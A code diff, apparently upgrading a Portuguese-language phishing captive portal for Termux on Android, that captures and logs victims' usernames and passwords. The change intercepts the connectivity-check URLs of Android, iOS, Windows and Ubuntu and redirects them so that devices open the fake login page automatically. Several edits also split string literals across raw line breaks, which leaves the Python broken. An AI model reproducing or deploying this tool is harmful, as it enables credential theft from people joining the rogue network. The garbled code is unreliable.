@@ -28,12 +28,42 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(CONFIG['log_file'], 'a') as f:
-            f.write("{0} - {1} - {2}\n".format(timestamp, self.address_string(), format % args))
+            f.write("{0} - {1} - {2}
+".format(timestamp, self.address_string(), format % args))
     
     def do_GET(self):
-        if self.path == '/' or self.path == '/index.html':
+        # Lista de URLs de verificacao de conectividade de diferentes sistemas
+        captive_check_urls = [
+            '/generate_204',           # Android
+            '/gen_204',                # Android alternativo
+            '/hotspot-detect.html',    # iOS/macOS
+            '/library/test/success.html', # iOS alternativo
+            '/connecttest.txt',        # Windows
+            '/redirect',               # Windows alternativo
+            '/ncsi.txt',               # Windows NCSI
+            '/success.txt',            # Varios sistemas
+            '/canonical.html',         # Ubuntu
+            '/connectivity-check.html', # Firefox OS
+            '/check_network_status.txt' # Outros
+        ]
+        
+        # Detectar se é uma verificacao de conectividade
+        is_captive_check = any(url in self.path for url in captive_check_urls)
+        
+        if is_captive_check:
+            # Responder com redirect para forcar abertura do portal
+            print("  [*] Detectada verificacao de captive portal de: {0}".format(self.client_address[0]))
+            self.send_response(302)
+            self.send_header('Location', 'http://{0}:{1}/'.format(get_local_ip(), CONFIG['port']))
+            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
+            self.send_header('Pragma', 'no-cache')
+            self.send_header('Expires', '0')
+            self.end_headers()
+            
+        elif self.path == '/' or self.path == '/index.html':
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
             self.end_headers()
             
             try:
@@ -41,9 +71,12 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
                     self.wfile.write(f.read())
             except FileNotFoundError:
                 self.wfile.write(b"<h1>Erro: templates/login.html nao encontrado</h1>")
+                
         else:
+            # Qualquer outra URL redireciona para a pagina inicial
             self.send_response(302)
             self.send_header('Location', '/')
+            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
             self.end_headers()
     
     def do_POST(self):
@@ -66,7 +99,8 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             
             self.save_credentials(credential_entry)
             
-            print("\n" + "="*70)
+            print("
+" + "="*70)
             print("  [NOVA CAPTURA]")
             print("="*70)
             print("  Timestamp: {0}".format(credential_entry['timestamp']))
@@ -74,7 +108,8 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
             print("  Senha: {0}".format(password))
             print("  IP: {0}".format(credential_entry['ip']))
             print("  Device: {0}".format(credential_entry['user_agent'][:50]))
-            print("="*70 + "\n")
+            print("="*70 + "
+")
             
             self.send_response(302)
             self.send_header('Location', CONFIG['redirect_url'])
@@ -104,8 +139,8 @@ def print_banner():
     banner = """
     ╔══════════════════════════════════════════════════════════════════╗
     ║                                                                  ║
-    ║          CAPTIVE PORTAL PROFISSIONAL v3.0                       ║
-    ║          Para Termux Android                                    ║
+    ║          CAPTIVE PORTAL PROFISSIONAL v3.1                       ║
+    ║          Para Termux Android - COM DETECÇÃO AUTOMÁTICA         ║
     ║                                                                  ║
     ╚══════════════════════════════════════════════════════════════════╝
     """
@@ -115,7 +150,6 @@ def get_local_ip():
     """Detectar IP automaticamente"""
     import socket
     try:
-        # Cria socket temporário
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
@@ -148,18 +182,27 @@ def run_server():
     print("  [+] Redirect: {0}".format(CONFIG['redirect_url']))
     print("  [+] Credenciais: {0}".format(CONFIG['credentials_file']))
     print("  [+] Logs: {0}".format(CONFIG['log_file']))
-    print("\n  " + "="*66)
+    print("  [+] Deteccao Captive Portal: ATIVADA")
+    print("
+  " + "="*66)
     print("  [*] ACESSE O PORTAL VIA:")
     print("  [*] http://{0}:{1}".format(local_ip, port))
     print("  " + "="*66)
-    print("\n  [*] Servidor rodando...")
-    print("  [*] Pressione Ctrl+C para parar\n")
+    print("
+  [*] Servidor rodando com deteccao automatica...")
+    print("  [*] Dispositivos podem abrir o portal automaticamente!")
+    print("  [*] Pressione Ctrl+C para parar
+")
     
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\n\n  [!] Servidor encerrado pelo usuario")
-        print("  [!] Total de capturas salvas em: {0}\n".format(CONFIG['credentials_file']))
+        print("
+
+  [!] Servidor encerrado pelo usuario")
+        print("  [!] Total de capturas salvas em: {0}
+".format(CONFIG['credentials_file']))
         sys.exit(0)
+
 if __name__ == '__main__':
     run_server()
